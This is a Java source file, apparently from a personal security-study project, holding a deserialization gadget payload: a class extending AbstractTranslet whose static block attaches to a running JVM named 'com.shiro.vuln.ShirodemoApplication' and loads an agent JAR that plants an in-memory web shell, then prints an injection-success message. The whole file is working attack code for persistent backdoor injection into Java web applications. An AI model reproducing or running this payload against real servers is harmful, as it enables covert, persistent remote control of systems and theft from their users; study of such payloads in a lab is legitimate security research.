import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Method;
import java.util.List;
import java.util.stream.Collectors;

import com.sun.tools.attach.*;

public class MemAgent extends AbstractTranslet {
    static {
        try{
            String path = "D:\\safetool\\Tools\\webleak\\POC\\Exploit\\java\\javatest\\Java-Study-source\\java内存马\\JavaAgent\\AgentMemShell\\target\\AgentMain-1.0-SNAPSHOT-jar-with-dependencies.jar";
            List<VirtualMachineDescriptor> attach = VirtualMachine.list().stream().filter(
                    jvm->{
                        return !jvm.displayName().contains("Attach");
                    }).collect(Collectors.toList());
            for (int i = 0; i < attach.size(); i++) {
                if((attach.get(i).displayName()).equals("com.shiro.vuln.ShirodemoApplication")){
                    VirtualMachine virtualMachine = VirtualMachine.attach(attach.get(i).id());
                    virtualMachine.loadAgent(path);
                    virtualMachine.detach();//附加完成之后分离
                }
            }
            System.out.println("MemAgent Inject Success !!");
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
